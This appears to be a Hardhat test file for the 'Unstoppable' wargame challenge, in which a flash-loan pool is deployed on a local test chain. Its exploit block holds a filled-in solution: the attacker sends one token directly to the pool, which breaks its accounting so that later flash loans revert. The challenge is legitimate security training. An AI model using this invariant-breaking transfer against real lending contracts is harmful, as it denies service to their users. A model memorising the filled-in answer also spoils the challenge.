import { ethers } from "hardhat";
import { expect } from "chai";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { DamnValuableToken, ReceiverUnstoppable, UnstoppableLender } from "../../typechain";

describe("[Challenge] Unstoppable", function () {
	let deployer: SignerWithAddress, attacker: SignerWithAddress, someUser: SignerWithAddress;
	let token: DamnValuableToken, pool: UnstoppableLender, receiverContract: ReceiverUnstoppable;

	// Pool has 1M * 10**18 tokens
	const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
	const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100");

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

		[deployer, attacker, someUser] = await ethers.getSigners();

		const DamnValuableTokenFactory = await ethers.getContractFactory("DamnValuableToken", deployer);
		const UnstoppableLenderFactory = await ethers.getContractFactory("UnstoppableLender", deployer);

		token = await DamnValuableTokenFactory.deploy();
		pool = await UnstoppableLenderFactory.deploy(token.address);

		await token.approve(pool.address, TOKENS_IN_POOL);
		await pool.depositTokens(TOKENS_IN_POOL);

		await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

		expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

		expect(await token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

		// Show it's possible for someUser to take out a flash loan
		const ReceiverContractFactory = await ethers.getContractFactory("ReceiverUnstoppable", someUser);
		receiverContract = await ReceiverContractFactory.deploy(pool.address);
		await receiverContract.executeFlashLoan(10);
	});

	it("Exploit", async function () {
		/** CODE YOUR EXPLOIT HERE */
		await token.connect(attacker).transfer(pool.address, ethers.utils.parseEther("1"));
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// It is no longer possible to execute flash loans
		await expect(receiverContract.executeFlashLoan(10)).to.be.reverted;
	});
});
